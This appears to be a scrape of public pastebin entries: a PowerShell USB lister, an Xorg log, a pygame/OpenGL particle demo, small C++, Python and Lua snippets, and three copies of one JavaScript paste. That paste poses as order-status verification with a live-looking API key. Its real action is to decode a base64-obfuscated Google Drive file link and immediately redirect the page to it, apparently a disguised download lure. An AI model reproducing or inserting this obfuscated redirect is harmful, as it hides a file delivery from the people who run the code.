    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BzdZ2xdr,Get-USBStorageDevicesInfo,J2897,PowerShell,Wednesday 2nd of April 2025 10:11:10 AM CDT,"# Retrieve USB storage devices using PNPDeviceID
$usbDevices = Get-PnpDevice | Where-Object { $_.PNPDeviceID -like ""USBSTOR*"" }

# Format and display the relevant information for each USB storage device
$usbDevices | ForEach-Object {
    [PSCustomObject]@{
        DeviceID     = $_.PNPDeviceID
        FriendlyName = $_.FriendlyName
        Status       = $_.Status
    }
} | Format-Table -AutoSize"
rhsL1NL9,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 09:58:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/649/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4Urh8pEY,2,nq1s788,Python,Wednesday 2nd of April 2025 09:53:05 AM CDT,"#(x or not y) and (y == z) and not w
print('x y z w')
for x in range(2):
    for y in range(2):
        for z in range(2):
            for w in range(2):
                if not ((x or not y) and (y == z) and not w):
                    print(x, y, z, w)"
SC2ebxrF,Test,Ri0n,Bash,Wednesday 2nd of April 2025 09:51:55 AM CDT,"[    27.807] (II) modeset(0): glamor X acceleration enabled on AMD Radeon R9 380 Series (radeonsi, tonga, ACO, DRM 3.61, 6.14.0)
[    27.807] (II) modeset(0): glamor initialized
[    27.807] (==) modeset(0): VariableRefresh: disabled
[    27.807] (==) modeset(0): AsyncFlipSecondaries: disabled
[    27.833] (II) modeset(0): Output DP-1 using monitor section DP-1
[    27.833] (**) modeset(0): Option ""Ignore"" ""true""
[    27.834] (II) modeset(0): Output HDMI-1 using monitor section HDMI-1
[    27.834] (**) modeset(0): Option ""Ignore"" ""true""
[    27.836] (II) modeset(0): Output DVI-D-1 using monitor section DVI-D-1
[    27.836] (**) modeset(0): Option ""Ignore"" ""true""
[    27.836] (II) modeset(0): Output DVI-I-1 using monitor section DVI-I-1
[    27.836] (II) modeset(0): EDID for output DVI-I-1
[    27.836] (II) modeset(0): Manufacturer: SWR  Model: 0  Serial#: 0
[    27.836] (II) modeset(0): Year: 2021  Week: 5
[    27.836] (II) modeset(0): EDID Version: 1.3
[    27.836] (II) modeset(0): Analog Display Input,  Input Voltage Level: 0.700/0.700 V
[    27.836] (II) modeset(0): Sync:  Separate  CompositeSerration on. V.Sync Pulse req. if CompSync or SyncOnGreen
[    27.836] (II) modeset(0): Max Image Size [cm]: horiz.: 48  vert.: 36
[    27.836] (II) modeset(0): Gamma: 2.20
[    27.836] (II) modeset(0): No DPMS capabilities specified; RGB/Color Display
[    27.836] (II) modeset(0): First detailed timing is preferred mode
[    27.836] (II) modeset(0): redX: 0.642 redY: 0.349   greenX: 0.292 greenY: 0.596
[    27.836] (II) modeset(0): blueX: 0.147 blueY: 0.125   whiteX: 0.312 whiteY: 0.328
[    27.836] (II) modeset(0): Manufacturer's mask: 0
[    27.836] (II) modeset(0): Supported detailed timing:
[    27.836] (II) modeset(0): clock: 15.6 MHz   Image Size:  485 x 364 mm
[    27.836] (II) modeset(0): h_active: 768  h_sync: 799  h_sync_end 872 h_blank_end 997 h_border: 0
[    27.836] (II) modeset(0): v_active: 576  v_sync: 583  v_sync_end 589 v_blanking: 627 v_border: 0
[    27.836] (II) modeset(0): Serial No: Switchres200
[    27.836] (II) modeset(0): Ranges: V min: 49 V max: 65 Hz, H min: 15 H max: 16 kHz,
[    27.836] (II) modeset(0): Monitor name: arcade_15
[    27.836] (II) modeset(0): EDID (in hex):
[    27.836] (II) modeset(0): 	00ffffffffffff004ef2000000000000
[    27.836] (II) modeset(0): 	051f01036d3024780a5ec0a4594a9825
[    27.836] (II) modeset(0): 	20505400000001010101010101010101
[    27.836] (II) modeset(0): 	0101010101011a0600e5304033201f49
[    27.836] (II) modeset(0): 	7600e56c11000098000000ff00537769
[    27.836] (II) modeset(0): 	7463687265733230300a000000fd0031
[    27.836] (II) modeset(0): 	410f10ff000a202020202020000000fc
[    27.836] (II) modeset(0): 	006172636164655f31350000000a00ec
[    27.836] (II) modeset(0): Printing probed modes for output DVI-I-1
[    27.836] (II) modeset(0): Modeline ""768x576i""x50.0   15.62  768 799 872 997  576 583 589 627 interlace -hsync -vsync (15.7 kHz eP)
[    27.836] (II) modeset(0): Modeline ""700x525""x60.0   61.00  700 744 820 940  525 526 532 541 doublescan +hsync +vsync (64.9 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x512""x60.0   54.00  640 664 720 844  512 512 514 533 doublescan +hsync +vsync (64.0 kHz d)
[    27.836] (II) modeset(0): Modeline ""700x450""x60.0   51.75  700 740 812 924  450 451 456 467 doublescan -hsync +vsync (56.0 kHz d)
[    27.836] (II) modeset(0): Modeline ""700x450""x59.9   43.25  700 724 740 780  450 451 456 463 doublescan +hsync -vsync (55.4 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x480""x60.0   54.00  640 688 744 900  480 480 482 500 doublescan +hsync +vsync (60.0 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x480""x59.9   25.18  640 656 752 800  480 490 492 525 -hsync -vsync (31.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""720x405""x59.5   22.50  720 744 808 896  405 408 413 422 -hsync +vsync (25.1 kHz d)
[    27.836] (II) modeset(0): Modeline ""720x405""x59.0   21.75  720 768 800 880  405 408 413 419 +hsync -vsync (24.7 kHz d)
[    27.836] (II) modeset(0): Modeline ""684x384""x59.9   42.62  684 720 788 892  384 385 390 399 doublescan -hsync +vsync (47.8 kHz d)
[    27.836] (II) modeset(0): Modeline ""684x384""x59.9   36.12  684 708 724 764  384 385 390 395 doublescan +hsync -vsync (47.3 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x400""x59.9   41.75  640 676 740 840  400 401 404 415 doublescan -hsync +vsync (49.7 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x400""x60.0   35.50  640 664 680 720  400 401 404 411 doublescan +hsync -vsync (49.3 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x360""x59.9   37.25  640 672 736 832  360 361 364 374 doublescan -hsync +vsync (44.8 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x360""x59.8   31.88  640 664 680 720  360 361 364 370 doublescan +hsync -vsync (44.3 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x360""x59.8   18.00  640 664 720 800  360 363 368 376 -hsync +vsync (22.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""640x360""x59.3   17.75  640 688 720 800  360 363 368 374 +hsync -vsync (22.2 kHz d)
[    27.836] (II) modeset(0): Modeline ""512x384""x60.0   32.50  512 524 592 672  384 385 388 403 doublescan -hsync -vsync (48.4 kHz d)
[    27.836] (II) modeset(0): Modeline ""512x288""x60.0   23.25  512 532 580 648  288 289 292 299 doublescan -hsync +vsync (35.9 kHz d)
[    27.836] (II) modeset(0): Modeline ""512x288""x59.9   21.00  512 536 552 592  288 289 292 296 doublescan +hsync -vsync (35.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""480x270""x59.6   20.38  480 496 544 608  270 271 274 281 doublescan -hsync +vsync (33.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""480x270""x59.8   18.62  480 504 520 560  270 271 274 278 doublescan +hsync -vsync (33.3 kHz d)
[    27.836] (II) modeset(0): Modeline ""400x300""x60.3   20.00  400 420 484 528  300 300 302 314 doublescan +hsync +vsync (37.9 kHz d)
[    27.836] (II) modeset(0): Modeline ""400x300""x56.3   18.00  400 412 448 512  300 300 301 312 doublescan +hsync +vsync (35.2 kHz d)
[    27.836] (II) modeset(0): Modeline ""432x243""x59.9   16.25  432 444 484 536  243 244 247 253 doublescan -hsync +vsync (30.3 kHz d)
[    27.836] (II) modeset(0): Modeline ""432x243""x59.6   15.25  432 456 472 512  243 244 247 250 doublescan +hsync -vsync (29.8 kHz d)
[    27.836] (II) modeset(0): Modeline ""320x240""x60.1   12.59  320 328 376 400  240 245 246 262 doublescan -hsync -vsync (31.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""360x202""x59.5   11.25  360 372 404 448  202 204 206 211 doublescan -hsync +vsync (25.1 kHz d)
[    27.836] (II) modeset(0): Modeline ""360x202""x59.1   10.88  360 384 400 440  202 204 206 209 doublescan +hsync -vsync (24.7 kHz d)
[    27.836] (II) modeset(0): Modeline ""320x180""x59.8    9.00  320 332 360 400  180 181 184 188 doublescan -hsync +vsync (22.5 kHz d)
[    27.836] (II) modeset(0): Modeline ""320x180""x59.3    8.88  320 344 360 400  180 181 184 187 doublescan +hsync -vsync (22.2 kHz d)
[    27.836] (II) modeset(0): Output DVI-I-1 connected
[    27.836] (II) modeset(0): Using exact sizes for initial modes
[    27.836] (II) modeset(0): Output DVI-I-1 using initial mode 768x576i +0+0
"
gv33T8VC,Python Pygame OpenGL Particle Demo,cookertron,Python,Wednesday 2nd of April 2025 09:48:13 AM CDT,"import pygame
from pygame.locals import *
import random
import math
import colorsys
import numpy as np
import ctypes # Needed for c_void_p

# Import OpenGL specific modules
from OpenGL.GL import *
from OpenGL.GL import shaders
# PyOpenGL_accelerate might improve performance if available
try:
    from OpenGL.GL.ARB.vertex_buffer_object import *
    _VBO_SUPPORT = True
except ImportError:
    _VBO_SUPPORT = False
    print(""VBO support not found. Performance may be reduced."")


# --- Shader Code ---
VERTEX_SHADER = """"""
#version 330 core
layout (location = 0) in vec2 aPos;      // Vertex position (x, y)
layout (location = 1) in vec4 aColor;    // Vertex color (r, g, b, a)
layout (location = 2) in float aSize;     // Vertex size

out vec4 vColor; // Pass color to fragment shader

uniform mat4 projection; // Projection matrix

void main()
{
    gl_Position = projection * vec4(aPos.x, aPos.y, 0.0, 1.0);
    gl_PointSize = aSize; // Set the point size
    vColor = aColor;      // Pass color through
}
""""""

FRAGMENT_SHADER = """"""
#version 330 core
in vec4 vColor; // Receive color from vertex shader
out vec4 FragColor; // Output fragment color

void main()
{
    // Optional: Make points round instead of square
    // vec2 coord = gl_PointCoord - vec2(0.5);
    // if(length(coord) > 0.5) {
    //     discard;
    // }
    FragColor = vColor; // Output the interpolated color
}
""""""

# --- OpenGL Helper Functions ---

def create_shader_program():
    """"""Compiles and links the vertex and fragment shaders.""""""
    try:
        vertex_shader = shaders.compileShader(VERTEX_SHADER, GL_VERTEX_SHADER)
        fragment_shader = shaders.compileShader(FRAGMENT_SHADER, GL_FRAGMENT_SHADER)
        program = shaders.compileProgram(vertex_shader, fragment_shader)
        return program
    except shaders.ShaderCompilationError as e:
        print(""Shader compilation error:"")
        # Attempt to decode error message if bytes
        error_msg = e.args[0]
        if isinstance(error_msg, bytes):
            try:
                error_msg = error_msg.decode()
            except UnicodeDecodeError:
                error_msg = str(error_msg) # Fallback if decoding fails
        print(error_msg)
        print(""Source:"")
        # Attempt to decode source if bytes
        shader_source = e.source
        if isinstance(shader_source, bytes):
             try:
                 shader_source = shader_source.decode()
             except UnicodeDecodeError:
                 shader_source = str(shader_source) # Fallback
        print(shader_source)
        raise

def create_orthographic_matrix(left, right, bottom, top, near, far):
    """"""Creates an orthographic projection matrix.""""""
    matrix = np.identity(4, dtype=np.float32)
    matrix[0, 0] = 2.0 / (right - left)
    matrix[1, 1] = 2.0 / (top - bottom)
    matrix[2, 2] = -2.0 / (far - near)
    matrix[0, 3] = -(right + left) / (right - left)
    matrix[1, 3] = -(top + bottom) / (top - bottom)
    matrix[2, 3] = -(far + near) / (far - near)
    return matrix

# --- Constants ---
WIDTH, HEIGHT = 1000, 700

# --- Particle Class (Physics logic remains mostly the same) ---
class Particle:
    def __init__(self, x, y, color, size=2, velocity=None, life=None):
        self.x = float(x) # Ensure float
        self.y = float(y) # Ensure float
        self.original_color_rgb = color[:3] # Store RGB separately
        self.alpha = float(color[3] / 255.0) # Store alpha as 0.0-1.0
        self.size = float(size)
        self.original_size = float(size)
        self.life = float(life if life else random.randint(50, 200)) # Adjusted life for GL
        self.max_life = float(self.life)
        self.velocity = velocity if velocity else [random.uniform(-1, 1), random.uniform(-1, 1)]
        self.velocity = [float(v) for v in self.velocity] # Ensure float
        self.gravity = 0.03
        self.decay = random.uniform(0.97, 0.995) # Slightly adjusted decay

    def update(self, mouse_pos, particles, attract=True):
        # Update position
        self.x += self.velocity[0]
        self.y += self.velocity[1]

        # Apply gravity toward/away from mouse
        dx = mouse_pos[0] - self.x
        dy = mouse_pos[1] - self.y
        # Add small epsilon to prevent division by zero if distance is exactly 0
        distance_sq = dx*dx + dy*dy
        distance = max(math.sqrt(distance_sq), 1e-6) # Avoid sqrt(0) and div by zero

        force_dir_x = dx / distance
        force_dir_y = dy / distance

        if attract:
            self.velocity[0] += force_dir_x * self.gravity
            self.velocity[1] += force_dir_y * self.gravity
        else:
            self.velocity[0] -= force_dir_x * self.gravity * 2
            self.velocity[1] -= force_dir_y * self.gravity * 2

        # Apply velocity decay
        self.velocity[0] *= self.decay
        self.velocity[1] *= self.decay

        # --- Particle interaction removed for simplicity/performance focus ---

        # Bounce off edges
        bounce_dampening = -0.5
        if self.x <= 0:
            self.velocity[0] *= bounce_dampening
            self.x = 1.0 # Prevent sticking slightly inside
        elif self.x >= WIDTH:
             self.velocity[0] *= bounce_dampening
             self.x = float(WIDTH - 1) # Prevent sticking slightly inside

        if self.y <= 0:
            self.velocity[1] *= bounce_dampening
            self.y = 1.0 # Prevent sticking slightly inside
        elif self.y >= HEIGHT:
            self.velocity[1] *= bounce_dampening
            self.y = float(HEIGHT - 1) # Prevent sticking slightly inside


        # Update life and appearance
        self.life -= 1.0
        # Ensure max_life is not zero before division
        life_ratio = max(0.0, self.life / self.max_life if self.max_life > 0 else 0.0)
        self.size = self.original_size * life_ratio
        self.alpha = life_ratio # Alpha directly tied to life ratio

    # No draw method needed; data is collected externally

    def is_dead(self):
        return self.life <= 0 or self.size < 0.5 # Remove if too small

    def get_data(self):
        """"""Returns data tuple for VBO: (x, y, r, g, b, a, size)""""""
        r, g, b = [c / 255.0 for c in self.original_color_rgb] # Normalize color
        # Ensure all data are floats
        return (float(self.x), float(self.y),
                float(r), float(g), float(b), float(self.alpha),
                float(self.size))

# --- Helper Functions (Color, Creation) ---
def get_color(hue):
    r, g, b = colorsys.hsv_to_rgb(hue, 1.0, 1.0)
    # Return RGBA tuple (alpha is set in Particle based on life)
    return (int(r * 255), int(g * 255), int(b * 255), 255) # Initial alpha 255

# Function to create burst particles
def create_burst(x, y, hue, count=5, vel_scale=2):
    particles = []
    for _ in range(count):
        size = random.uniform(2, 8)
        color = get_color(hue)
        vel = [random.uniform(-vel_scale, vel_scale), random.uniform(-vel_scale, vel_scale)]
        life = random.randint(40, 150) # Adjusted life
        particles.append(Particle(x, y, color, size, vel, life))
    return particles

# Function to create explosion particles
def create_explosion(x, y, hue, count=50):
    return create_burst(x, y, hue, count, vel_scale=5)


# --- Main Function ---
def main():
    pygame.init()
    # Setup OpenGL context flags
    pygame.display.gl_set_attribute(pygame.GL_CONTEXT_MAJOR_VERSION, 3)
    pygame.display.gl_set_attribute(pygame.GL_CONTEXT_MINOR_VERSION, 3)
    pygame.display.gl_set_attribute(pygame.GL_CONTEXT_PROFILE_MASK, pygame.GL_CONTEXT_PROFILE_CORE)
    pygame.display.gl_set_attribute(pygame.GL_DOUBLEBUFFER, 1) # Use double buffering
    pygame.display.gl_set_attribute(pygame.GL_DEPTH_SIZE, 24) # Optional depth buffer

    # Create window with OpenGL support
    screen = pygame.display.set_mode((WIDTH, HEIGHT), DOUBLEBUF | OPENGL)
    pygame.display.set_caption(""Cosmic Particle Galaxy (OpenGL - Fixed)"")
    clock = pygame.time.Clock()

    # --- OpenGL Initialization ---
    print(""OpenGL Vendor:"", glGetString(GL_VENDOR).decode())
    print(""OpenGL Renderer:"", glGetString(GL_RENDERER).decode())
    print(""OpenGL Version:"", glGetString(GL_VERSION).decode())
    print(""GLSL Version:"", glGetString(GL_SHADING_LANGUAGE_VERSION).decode())

    # Compile and link shaders
    shader_program = create_shader_program()
    glUseProgram(shader_program) # Use program once to set uniforms

    # Get uniform location for projection matrix
    proj_location = glGetUniformLocation(shader_program, ""projection"")
    if proj_location == -1:
         print(""Warning: 'projection' uniform not found in shader."")

    # Create orthographic projection matrix (maps pixel coords to OpenGL coords)
    projection_matrix = create_orthographic_matrix(0, WIDTH, HEIGHT, 0, -1, 1) # Top-left origin
    # Apply the projection matrix
    glUniformMatrix4fv(proj_location, 1, GL_TRUE, projection_matrix)
    glUseProgram(0) # Unbind shader after setting uniform


    # --- VAO & VBO Setup ---
    if not _VBO_SUPPORT:
        print(""Cannot run without VBO support. Exiting."")
        return

    # ** 1. Generate VAO **
    vao = glGenVertexArrays(1)
    # 2. Generate VBO
    vbo = glGenBuffers(1)

    # ** 3. Bind VAO **
    glBindVertexArray(vao)

    # 4. Bind VBO
    glBindBuffer(GL_ARRAY_BUFFER, vbo)

    # --- Get attribute locations (need shader bound) ---
    glUseProgram(shader_program)
    pos_loc = glGetAttribLocation(shader_program, ""aPos"")
    col_loc = glGetAttribLocation(shader_program, ""aColor"")
    size_loc = glGetAttribLocation(shader_program, ""aSize"")
    glUseProgram(0) # Unbind shader again

    if -1 in (pos_loc, col_loc, size_loc):
        print(""Warning: Could not get all attribute locations (aPos, aColor, aSize)."")
        print(f""Pos: {pos_loc}, Color: {col_loc}, Size: {size_loc}"")
        # Consider exiting or handling this more gracefully if locations are missing

    # ** 5. Configure vertex attribute pointers **
    #    (These settings are stored in the bound VAO)
    stride = 7 * np.dtype(np.float32).itemsize # 7 floats, calculate size robustly
    offset_pos = ctypes.c_void_p(0)
    offset_col = ctypes.c_void_p(2 * np.dtype(np.float32).itemsize) # Offset after 2 pos floats
    offset_size = ctypes.c_void_p(6 * np.dtype(np.float32).itemsize) # Offset after pos (2) + color (4) floats

    # Position (Attribute 0)
    glVertexAttribPointer(pos_loc, 2, GL_FLOAT, GL_FALSE, stride, offset_pos)
    glEnableVertexAttribArray(pos_loc)
    # Color (Attribute 1)
    glVertexAttribPointer(col_loc, 4, GL_FLOAT, GL_FALSE, stride, offset_col)
    glEnableVertexAttribArray(col_loc)
    # Size (Attribute 2)
    glVertexAttribPointer(size_loc, 1, GL_FLOAT, GL_FALSE, stride, offset_size)
    glEnableVertexAttribArray(size_loc)

    # ** 6. Unbind VBO first, then VAO **
    #    (Order matters less here, but good practice)
    glBindBuffer(GL_ARRAY_BUFFER, 0)
    glBindVertexArray(0)


    # --- OpenGL State ---
    glClearColor(0.0, 0.0, 0.0, 1.0) # Black background
    glEnable(GL_BLEND) # Enable blending for transparency
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA) # Standard alpha blending
    glEnable(GL_PROGRAM_POINT_SIZE) # Allow shaders to set point size


    # --- Game Variables ---
    particles = []
    hue = 0.0
    attract_mode = True
    last_click_time = 0
    max_particles = 10000 # Can usually handle more particles now

    # --- Text Setup ---
    font = pygame.font.Font(None, 24)
    ui_dirty = True # Flag to rerender text only when needed
    text_surfaces = [] # Initialize list

    # --- Main Loop ---
    running = True
    while running:
        current_time = pygame.time.get_ticks()
        mouse_pos = pygame.mouse.get_pos()
        dt = clock.tick(60) / 1000.0 # Delta time in seconds

        # --- Event Handling ---
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                     running = False
                elif event.key == pygame.K_SPACE:
                    attract_mode = not attract_mode
                    ui_dirty = True
                elif event.key == pygame.K_c:
                    particles = []
            elif event.type == pygame.MOUSEBUTTONDOWN:
                if event.button == 1: # Left click
                     if current_time - last_click_time > 100:
                         particles.extend(create_explosion(mouse_pos[0], mouse_pos[1], hue))
                         last_click_time = current_time

        # --- Particle Creation ---
        if pygame.mouse.get_rel() != (0, 0):
             if random.random() < 0.5:
                 particles.extend(create_burst(mouse_pos[0], mouse_pos[1], hue, count=2, vel_scale=1.5))

        hue = (hue + 0.002) % 1.0

        if random.random() < 0.05:
            angle = random.uniform(0, math.pi * 2)
            dist = random.uniform(50, 200)
            x = mouse_pos[0] + math.cos(angle) * dist
            y = mouse_pos[1] + math.sin(angle) * dist
            if 0 <= x < WIDTH and 0 <= y < HEIGHT:
                 color = get_color(hue)
                 particles.append(Particle(x, y, color, random.uniform(2, 5), life=random.randint(60,180)))


        # --- Particle Update and Data Collection ---
        live_particle_data = []
        num_live_particles = 0
        for i in range(len(particles) - 1, -1, -1):
            p = particles[i]
            p.update(mouse_pos, particles, attract_mode)
            if p.is_dead():
                del particles[i]
            else:
                live_particle_data.extend(p.get_data())
                num_live_particles += 1 # Count live particles correctly

        # Limit particle count
        if num_live_particles > max_particles:
            # Remove oldest particles (those added first)
            num_to_remove = num_live_particles - max_particles
            del particles[0 : num_to_remove]
            # Need to regenerate data if particles were removed this way
            live_particle_data = []
            num_live_particles = 0
            for p in particles:
                 live_particle_data.extend(p.get_data())
                 num_live_particles += 1

        # Set flag to update UI particle count
        if 'particle_count_text' not in locals() or particle_count_text != f""Particles: {num_live_particles}"":
            ui_dirty = True


        # --- OpenGL Rendering ---
        glClear(GL_COLOR_BUFFER_BIT) # Clear the screen (color buffer)

        if live_particle_data and num_live_particles > 0:
             # Convert collected data to a NumPy array
             vertex_data = np.array(live_particle_data, dtype=np.float32)

             # Bind the VBO and upload the data
             glBindBuffer(GL_ARRAY_BUFFER, vbo)
             # Use glBufferData: potentially faster for rapidly changing data
             glBufferData(GL_ARRAY_BUFFER, vertex_data.nbytes, vertex_data, GL_DYNAMIC_DRAW)
             # Alternative: glBufferSubData if buffer size rarely changes (might be slower here)
             # glBufferSubData(GL_ARRAY_BUFFER, 0, vertex_data.nbytes, vertex_data)
             glBindBuffer(GL_ARRAY_BUFFER, 0) # Unbind VBO after upload

             # Activate the shader program
             glUseProgram(shader_program)

             # ** BIND THE VAO **
             # This sets up the VBO binding and attribute pointers automatically
             glBindVertexArray(vao)

             # Draw the points!
             glDrawArrays(GL_POINTS, 0, num_live_particles) # Use correct count

             # ** Unbind VAO ** and shader program
             glBindVertexArray(0)
             glUseProgram(0)


             # Bind the VBO and upload the data
             glBindBuffer(GL_ARRAY_BUFFER, vbo)
             glBufferData(GL_ARRAY_BUFFER, vertex_data.nbytes, vertex_data, GL_DYNAMIC_DRAW)
             glBindBuffer(GL_ARRAY_BUFFER, 0) # Unbind VBO after upload

             # Activate the shader program
             glUseProgram(shader_program)

             # ** BIND THE VAO **
             glBindVertexArray(vao)

             # Draw the points!
             glDrawArrays(GL_POINTS, 0, num_live_particles) # Use correct count

             # ** Unbind VAO ** and shader program
             glBindVertexArray(0)
             glUseProgram(0)

        # --- UI Text Rendering (Using Pygame Surface Blitting) ---
        if ui_dirty: # Only render text if mode or count changed
             mode_text = f""{'Attraction' if attract_mode else 'Repulsion'} Mode (SPACE)""
             clear_text = ""Press C to clear""
             click_text = ""Click to create explosions""
             particle_count_text = f""Particles: {num_live_particles}""

             text_surfaces = [
                 font.render(mode_text, True, (255, 255, 255)),
                 font.render(clear_text, True, (255, 255, 255)),
                 font.render(click_text, True, (255, 255, 255)),
                 font.render(particle_count_text, True, (255, 255, 255))
             ]
             ui_dirty = False # Reset flag

        # Blit cached text surfaces
        for i, text_surface in enumerate(text_surfaces):
             screen.blit(text_surface, (10, 10 + i * 25))


        # --- Display Update ---
        pygame.display.flip() # Swaps the front and back buffers

    # --- Cleanup ---
    print(""Cleaning up OpenGL objects..."")
    # Delete OpenGL objects (VAO first, then VBO, then Shader)
    glDeleteVertexArrays(1, [vao])
    glDeleteBuffers(1, [vbo])
    glDeleteProgram(shader_program)
    print(""Cleanup complete."")
    pygame.quit()


if __name__ == ""__main__"":
    main()"
GR1iVziq,Arkusz,-nodo-,C++,Wednesday 2nd of April 2025 09:29:03 AM CDT,"#include <stdlib.h>
#include <random>
#include <iostream>

using namespace std;

class Array {
public:
    Array(int size) : size(size) {
        arr = (int *)malloc(size * sizeof(int));

        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<int> dist(1, 1000);

        for (int i = 0; i < size; i++) {
            arr[i] = dist(gen);
        }
    }

    void print() {
        for (int i = 0; i < size; i++) {
            cout << i << "": "" << arr[i] << endl;
        }
    }

    int find(int num) {
        int i;

        for (i = 0; i < size; i++) {
            if (arr[i] == num)
                break;
        }   

        return i < size ? i : -1;
    }

    int print_odd() {
        int count = 0;

        for (int i = 0; i < size; i++) {
            if (arr[i] % 2) {
                cout << arr[i] << endl;
                count++;
            }
        }

        return count;
    }

    float avg() {
        int sum = 0;

        for (int i = 0; i < size; i++) {
            sum += arr[i];
        }

        return (float)sum / size;
    }

    ~Array() {
        free(arr);
    }

private:
    int* arr;
    int size;
};

int main() {
    Array a(8);
    a.print();

    int found = a.find(15);

    if (found != -1) {
        cout << ""Found @ "" << found << endl;
    }

    cout << ""Liczby nieparzyste:"" << endl;
    int odd = a.print_odd();
    cout << ""Razem nieparzystych: "" << odd << endl;
    cout << ""Średnia wszystkich elementów: "" << a.avg() << endl;

    return 0;
}"
xsnYehQn,Untitled,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 09:27:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/226/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GYq0PgFb,Untitled,Tkap1,C++,Wednesday 2nd of April 2025 09:03:41 AM CDT,"// In some languages, you can do this
// USAGE
for enemy_iterator() {
	// do things with enemy
	enemy.name = ""clown"";
}

// IMPLEMENTATION
enemy_iterator()
{
	chunks = get_chunks(...)
	for each chunk {
		for each enemy in chunk {
			yield; // this basically pastes the enemy.name = ""clown""; in here
		}
	}
}

// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// To do this in C, you can do something like this (kinda cringe)
// USAGE
EnemyIterator iterator = {};
while(enemy_iterator(&iterator)) {
	iterator.enemy.name = ""clown"";
}

// IMPLEMENTATION
bool enemy_iterator(EnemyIterator* iterator)
{
	chunks = get_chunks(...);
	for(int i = iterator->chunk_index; i < chunk_count; i += 1) {
		Chunk chunk = chunks[i];
		iterator->chunk_index += 1;
		for(int j = iterator->enemy_index; j < chunk.enemy_count; j += 1) {
			iterator->enemy_index += 1;
			Enemy* enemy = chunk.enemies[j];
			iterator->enemy = enemy;
			return true;
		}
	}
	return false;
}"
4LMqM2pB,data-updates.lua,Krypt0n_C0R3,Lua,Wednesday 2nd of April 2025 08:53:41 AM CDT,"    local machines = {
        data.raw[""beacon""],
        data.raw[""assembling-machine""],
        data.raw[""lab""],
        data.raw[""mining-drill""]
    }

    for _, machineType in pairs(machines) do
        for _, machine in pairs(machineType) do
            if not (machine.allowed_module_categories == nil) then
                for i, moduleCat in pairs(machine.allowed_module_categories) do
                    if moduleCat.name == ""hc-heating-coils"" then
                        table.remove(machine.allowed_module_categories,i)
                        break
                    end
                end
            elseif not(machine.module_slots == nil) and machine.module_slots > 0 and not(machine.allowed_effects == nil)  then
                if(machine.allowed_module_categories == nil) then
                    machine.allowed_module_categories = {}
                end

                for _, moduleCat in pairs(data.raw[""module-category""]) do
